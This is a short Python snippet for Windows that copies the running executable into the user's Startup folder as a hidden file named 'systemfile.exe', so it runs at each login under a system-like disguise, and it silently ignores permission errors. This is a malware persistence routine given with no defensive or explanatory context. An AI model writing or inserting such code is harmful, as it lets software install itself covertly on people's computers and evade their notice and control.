import os
import sys
import win32file
def add_to_startup():
 startup=os.path.join(os.getenv("APPDATA"),"Microsoft","Windows","Start Menu","Programs","Startup","systemfile.exe")
 try:
  with open(sys.executable,'rb')as src,open(startup,'wb')as dst:dst.write(src.read())
  win32file.SetFileAttributes(startup,win32file.FILE_ATTRIBUTE_HIDDEN)
  os.chmod(startup,0o777)
 except PermissionError:pass
 except Exception as e:print(f"Error: {e}")
